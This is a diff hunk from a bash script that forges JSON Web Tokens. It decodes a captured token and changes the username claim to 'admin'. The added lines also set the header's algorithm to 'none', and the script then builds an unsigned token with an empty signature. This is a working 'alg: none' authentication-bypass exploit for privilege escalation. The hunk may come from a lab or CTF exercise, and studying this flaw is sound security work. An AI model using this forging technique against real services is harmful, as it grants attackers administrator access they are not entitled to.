@@ -42,9 +42,11 @@ PAYLOAD=$(echo "$TOKEN" | awk -F. '{print $2}' | base64 -d)
 echo "--> Decoded token header : $HEADER"
 echo "--> Decoded token payload : $PAYLOAD"
 
+MODIFIED_HEADER=$(echo "$HEADER" | jq '.alg = "none"' | tr -d '\n' | tr -d ' ')
 MODIFIED_PAYLOAD=$(echo "$PAYLOAD" | jq '.username = "admin"' | tr -d '\n' | tr -d ' ')
+echo "--> Modified token header : $MODIFIED_HEADER"
 echo "--> Modified token payload : $MODIFIED_PAYLOAD"
-ENCODED_HEADER=$(echo "$HEADER"  | tr -d '\n' | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
+ENCODED_HEADER=$(echo "$MODIFIED_HEADER"  | tr -d '\n' | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
 ENCODED_PAYLOAD=$(echo "$MODIFIED_PAYLOAD"  | tr -d '\n' | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
 UNSIGNED_TOKEN="$ENCODED_HEADER.$ENCODED_PAYLOAD."
 echo "--> Token modified : $UNSIGNED_TOKEN"
